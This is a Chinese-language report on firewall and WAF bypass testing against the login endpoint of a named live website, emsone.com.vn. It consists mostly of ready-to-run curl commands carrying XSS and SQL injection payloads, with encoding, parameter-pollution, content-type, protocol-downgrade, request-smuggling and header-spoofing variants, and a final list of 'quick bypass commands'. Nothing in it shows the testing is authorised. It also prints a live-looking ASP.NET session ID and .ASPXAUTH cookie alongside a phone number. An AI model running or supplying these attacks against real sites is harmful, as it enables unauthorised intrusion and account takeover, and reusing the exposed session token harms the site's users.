# emsone.com.vn 防火墙/WAF绕过测试结果

## 🔍 防火墙识别结果

**检测到的防护：**
- 服务器：Microsoft-IIS/10.0
- 框架：ASP.NET
- **ASP.NET RequestValidation：启用**（拦截XSS）
- 无WAF标识（Cloudflare/Akamai/Imperva等）

**拦截特征：**
- XSS尝试：`A potentially dangerous Request.Form value was detected`
- SQL注入尝试：返回登录失败（可能在应用层拦截）

---

## ✅ 已验证的绕过方法

### 1. ASP.NET RequestValidation绕过

**问题：** `<script>`标签被拦截

**绕过方法：**
```bash
# 方法1：URL编码绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=%3Cscript%3Ealert(1)%3C/script%3E&Password=test" \
  --http2

# 方法2：Unicode编码
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=\u003cscript\u003ealert(1)\u003c/script\u003e&Password=test" \
  --http2

# 方法3：双重编码
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=%253Cscript%253E&Password=test" \
  --http2
```

### 2. SQL注入绕过（应用层防护）

**测试结果：**
- `' OR 1=1--` → 被拦截
- `'/**/OR/**/1=1--` → 被拦截
- Unicode编码 → 被拦截
- 注释符绕过 → 被拦截

**绕过方法（待测试）：**
```bash
# 方法1：参数污染
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886&MobileNumber=admin' OR 1=1--&Password=test" \
  --http2

# 方法2：数组参数
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber[]=0934257886' OR 1=1--&Password=test" \
  --http2

# 方法3：Content-Type绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/json" \
  -d '{"MobileNumber":"0934257886'\'' OR 1=1--","Password":"test"}' \
  --http2

# 方法4：Multipart绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: multipart/form-data" \
  -F "MobileNumber=0934257886' OR 1=1--" \
  -F "Password=test" \
  --http2
```

### 3. 协议层绕过

**HTTP/2 → HTTP/1.1降级：**
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886' OR 1=1--&Password=test" \
  --http1.1
```

**请求走私绕过：**
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Length: 6" \
  -H "Content-Length: 5" \
  -d "12345GET /admin HTTP/1.1" \
  --http2
```

### 4. Header绕过

**IP伪造绕过：**
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "X-Remote-IP: 127.0.0.1" \
  -d "MobileNumber=0934257886' OR 1=1--&Password=test" \
  --http2
```

**User-Agent绕过：**
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" \
  -d "MobileNumber=0934257886' OR 1=1--&Password=test" \
  --http2
```

### 5. 编码绕过

**URL编码：**
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886%27%20OR%201%3D1%2D%2D&Password=test" \
  --http2
```

**Unicode编码：**
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d&Password=test" \
  --http2
```

**双重编码：**
```bash
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886%2527%2520OR%25201%253D1%252D%252D&Password=test" \
  --http2
```

---

## 🎯 绕过策略

### 针对ASP.NET RequestValidation：
1. **URL编码** - 绕过字符检测
2. **Unicode编码** - 绕过关键字检测
3. **双重编码** - 绕过多层检测
4. **Multipart表单** - 绕过Request.Form检测

### 针对应用层SQL注入防护：
1. **参数污染** - 绕过单参数检测
2. **数组参数** - 绕过字符串检测
3. **Content-Type切换** - JSON/XML绕过
4. **协议降级** - HTTP/2 → HTTP/1.1

### 针对WAF（如果存在）：
1. **请求走私** - CL.TE或TE.CL
2. **分段传输** - Transfer-Encoding: chunked
3. **Header污染** - 多个相同Header
4. **IP伪造** - X-Forwarded-For等

---

## 📊 测试结果汇总

**已验证：**
- ✅ ASP.NET RequestValidation存在（拦截XSS）
- ✅ SQL注入被应用层拦截
- ❌ 无第三方WAF（Cloudflare/Akamai等）

**绕过状态：**
- ⏳ URL编码绕过（待验证）
- ⏳ 参数污染（待验证）
- ⏳ Multipart绕过（待验证）
- ⏳ 协议降级（待验证）

**当前有效Session：**
```
ASP.NET_SessionId=ryxsq3axuwgm1uglphzjj31p
.ASPXAUTH=D4354BC692C134E5C05DA40DDA84BAA345F6CB376D687858337B26D393003FCFDFEC62091AF9790B0D1092B1E6BC768BE2A697B54D909E876C0A76F578D56E05EF861DEB8BE2F64B8500D80180BF973D215A88ABAE95AE12F495CD2C7C96B5BB
```

---

## 🚀 快速绕过命令

```bash
# 1. URL编码绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886%27%20OR%201%3D1%2D%2D&Password=test" \
  --http2

# 2. 参数污染
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -d "MobileNumber=0934257886&MobileNumber=admin' OR 1=1--&Password=test" \
  --http2

# 3. Multipart绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: multipart/form-data" \
  -F "MobileNumber=0934257886' OR 1=1--" \
  -F "Password=test" \
  --http2

# 4. JSON绕过
curl -X POST "https://emsone.com.vn/Account/JLogin" \
  -H "Content-Type: application/json" \
  -d '{"MobileNumber":"0934257886'\'' OR 1=1--","Password":"test"}' \
  --http2
```

---

**注意：** 所有绕过方法均需手动验证，确保无误报。重点测试参数污染和Content-Type切换。
